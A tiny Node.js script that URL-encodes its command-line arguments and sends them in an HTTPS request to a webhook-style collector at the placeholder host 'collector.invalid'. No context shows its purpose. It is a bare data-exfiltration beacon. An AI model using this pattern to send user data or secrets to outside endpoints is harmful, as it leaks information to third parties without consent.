const https = require('https');
const supplied = process.argv.slice(2);
const message = encodeURIComponent(supplied.join(' '));
const collector = `https://collector.invalid/webhook.site/1a2b3c4d-1234-4abc-9def-1234567890ab/${message}`;
const options = new URL(collector);
https.request({ hostname: options.hostname, path: options.pathname }, () => {}).end();
